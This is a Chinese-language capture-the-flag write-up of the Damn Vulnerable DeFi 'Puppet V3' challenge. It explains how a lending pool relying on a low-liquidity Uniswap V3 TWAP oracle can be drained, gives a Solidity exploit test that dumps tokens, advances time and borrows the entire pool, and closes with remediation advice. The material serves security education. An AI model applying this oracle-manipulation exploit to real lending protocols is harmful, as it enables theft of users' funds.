# Puppet V3

## 一、题目简介

本题是 Puppet V2 的迭代加固版本，开发者针对 V2 瞬时价格操纵漏洞做了重点修复，将价格预言机从**Uniswap V2 瞬时储备价格** 升级为 **Uniswap V3 TWAP 时间加权平均价格预言机**，彻底摒弃单区块快照定价。同时重构了借贷抵押计算逻辑，保留3倍超额抵押规则，试图通过时间加权机制抵御闪电贷、单区块砸盘价格攻击。

合约核心规则：用户借贷 DVT 代币，需抵押3倍价值的 WETH，仅支持 WETH 作为抵押物。价格由 Uniswap V3 池子10分钟 TWAP 加权均价决定，规避瞬时价格操纵，看似完成安全加固，实则存在**时间维度风控漏洞**。

基础环境参数：

- 借贷池风险资产：**1000000 DVT**

- Uniswap V3 交易对：低流动性池子，3000费率交易对

- 玩家初始资产：**1 ETH、110000 DVT**

- 预言机机制：10分钟 TWAP 时间加权平均价格

解题目标：掏空借贷池内全部 DVT 代币，并将所有代币存入指定 recovery 回收账户。

## 二、审计视角

### 1\. 核心高危漏洞：TWAP 滞后性可控价格操纵

开发者错误认为 TWAP 价格绝对安全，固定选取 **过去10分钟的价格加权均值** 作为定价依据。TWAP 机制的特性是**价格更新存在严重滞后性**，不会实时跟随市场价格变动。攻击者可以通过大额交易瞬间砸低现货价格，再通过时间流逝，让恶意低价逐步纳入 TWAP 加权计算，最终篡改预言机全局价格。
```solidity
function _getOracleQuote(uint128 amount) private view returns (uint256) {
    // 取过去10分钟的TWAP均价
    (int24 arithmeticMeanTick,) = OracleLibrary.consult({pool: address(uniswapV3Pool), secondsAgo: TWAP_PERIOD});
    return OracleLibrary.getQuoteAtTick({
        tick: arithmeticMeanTick,
        baseAmount: amount,
        baseToken: address(token),
        quoteToken: address(weth)
    });
}
```
漏洞核心：TWAP 只能防御**瞬时单区块**价格攻击，无法防御**持续一段时间的稳态低价攻击**。

### 2\. 抵押风控完全依赖可滞后操控预言机

借贷合约的抵押金额计算逻辑完全依赖 V3 TWAP 预言机价格，未做任何兜底校验：

通过 `observe()` 获取历史时间点价格权重，计算加权均价，以此核算所需 WETH 抵押数量。攻击者可人为制造长期低价，让 DVT 预言机价格无限趋近于0，3倍超额抵押规则彻底失效，抵押成本近乎归零。

### 3\. 业务风控缺失严重

合约仅依赖 TWAP 机制做安全防护，无任何辅助风控：无价格波动阈值校验、无TWAP时间窗口熔断、无流动性深度校验、无借贷限额限制。只要攻击者持续维持恶意低价一段时间，即可无条件击穿风控。

## 三、开发者默认安全假设

1\. **机制迷信**：盲目信任 Uniswap V3 TWAP 预言机，认为时间加权价格可以抵御所有价格操纵攻击，忽略TWAP滞后性缺陷。

2\. **风险认知片面**：仅防护 V2 瞬时单区块攻击，未考虑**持续稳态价格操纵**的攻击场景。

3\. **单一风控依赖**：将所有资产安全寄托于预言机机制，未搭配价格熔断、多预言机校验、流动性校验等多层防护。

4\. **固定时间窗口风险**：硬编码10分钟TWAP采样窗口，无法动态适配市场价格波动，给攻击者预留充足操作时间。

## 四、同类项目审计点
1\. **TWAP 机制深度校验**：TWAP 不是绝对安全，短时间窗口易被操控，长时间窗口存在滞后性漏洞，需根据业务场景动态配置。

2\. **区分瞬时攻击与稳态攻击**：所有时间加权预言机，必须校验价格持续异常波动场景，不能仅防护单区块闪电攻击。

3\. **时间窗口风控**：固定TWAP采样窗口属于高危设计，需支持动态调整，搭配价格偏差熔断机制。

4\. **低流动性池子禁用**：低深度 AMM 交易对，无论 V2 瞬时价格还是 V3 TWAP 价格，均不可作为金融合约定价数据源。

5\. **多层风控兜底**：预言机价格必须搭配流动性校验、价格波动率校验、单笔借贷限额、紧急暂停机制。

## 五、完整解题思路

1\. **资产适配转换**：将玩家原生 ETH 兑换为合约唯一认可的抵押资产 WETH，满足借贷抵押物要求。

2\. **大额砸盘制造低价**：利用玩家大额 DVT 筹码，通过 Uniswap V3 路由兑换 WETH，借助池子低流动性，瞬间将 DVT 现货价格砸至极低。

3\. **时间流逝刷新TWAP**：通过区块时间跳跃，持续等待区块时间流逝，让恶意低价逐步覆盖10分钟TWAP采样窗口，篡改预言机加权均价。

4\. **零成本抵押借贷**：TWAP预言机价格被操控后，DVT定价趋近于0，借贷所需WETH抵押金额大幅降低，玩家余额足以满足抵押要求。

5\. **掏空资金池并通关**：一次性借走池中全部 DVT，将盗取资产转账至官方 recovery 回收账户，完成解题。

## 六、报错复盘

### 报错1：Uniswap V3 swap 非合约地址回调报错

**报错原因**：直接调用底层 pool.swap 方法，接收者为普通钱包地址，V3 swap 自带回调校验，普通地址无法处理回调逻辑，触发调用异常。

**解决方案**：放弃底层swap调用，使用官方 SwapRouter 路由合约进行交易，规避回调校验问题。

### 报错2：算术溢出/余额不足报错

**报错原因**：提前消耗玩家代币、转账金额超出账户余额，导致运算溢出。

**解决方案**：优化代码执行顺序，先完成砸盘交易，再执行借贷逻辑，保证代币余额逻辑正确。

### 报错3：TWAP价格未更新、抵押金额不足

**报错原因**：未等待区块时间流逝，TWAP仍读取历史高价数据，抵押成本未降低。

**解决方案**：循环跳过区块时间，持续刷新TWAP采样数据，直至抵押成本达标。

## 七、EXP  

```solidity
// 适配 Uniswap V3 路由接口
interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }
    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

function test_puppetV3() public checkSolvedByPlayer {
    // 1. 将原生 ETH 兑换为抵押所需的 WETH
    weth.deposit{value: PLAYER_INITIAL_ETH_BALANCE}();

    // 2. 授权代币给 V3 路由，用于砸盘交易
    token.approve(address(swapRouter), type(uint256).max);

    // 3. 初始化 Uniswap V3 路由
    ISwapRouter swapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    // 4. 全额卖出 DVT 代币，砸低现货价格
    swapRouter.exactInputSingle(
        ISwapRouter.ExactInputSingleParams({
            tokenIn: address(token),
            tokenOut: address(weth),
            fee: FEE,
            recipient: player,
            deadline: block.timestamp,
            amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        })
    );

    // 5. 时间流逝，刷新 TWAP 加权价格，等待抵押成本降低
    for (uint256 i = 0; i < 120; i++) {
        skip(1);
        // 校验抵押条件，满足后立即借贷
        if (weth.balanceOf(player) >= lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE)) {
            break;
        }
    }

    // 6. 授权 WETH 抵押物至借贷池
    weth.approve(address(lendingPool), type(uint256).max);

    // 7. 一次性掏空借贷池全部资产
    uint256 drainAmount = LENDING_POOL_INITIAL_TOKEN_BALANCE;
    lendingPool.borrow(drainAmount);

    // 8. 转账至回收账户，完成通关
    token.transfer(recovery, drainAmount);
}

```

## 八、合约修复方案

1\. **优化TWAP采样机制**：摒弃固定10分钟时间窗口，采用动态加权采样，同时增加最新价格权重，降低历史过期价格影响，规避稳态价格操纵。

2\. **新增价格波动率熔断**：实时校验TWAP价格与现货价格偏差，价差超过阈值（如20%）时触发熔断，暂停借贷功能。

3\. **增加流动性深度校验**：定价前校验交易对流动性，低深度池子直接禁用，杜绝小额筹码操控全局价格。

4\. **增设借贷风控限制**：添加单笔借贷上限、单用户借贷额度、池子资金留存比例，防止资金被一次性掏空。

5\. **多预言机交叉校验**：接入链上多源价格预言机，与V3 TWAP价格做交叉比对，单一数据源异常时自动切换备用数据源。

## 九、漏洞总结

Puppet V3 核心论证了：**升级预言机机制 ≠ 彻底安全**。开发者从 V2 瞬时价格漏洞修复至 V3 TWAP 时间加权价格，解决了单区块闪电攻击，但忽略了 TWAP 固有的时间滞后性缺陷。

在低流动性交易对场景下，攻击者可通过**制造长期稳态低价+时间流逝刷新权重**的组合攻击，彻底篡改TWAP预言机价格，击穿3倍超额抵押风控，最终掏空合约全部资金。该漏洞揭示了DeFi预言机设计的核心准则：任何单一定价机制都存在缺陷，必须依靠多层、多维的兜底风控体系保障资产安全。
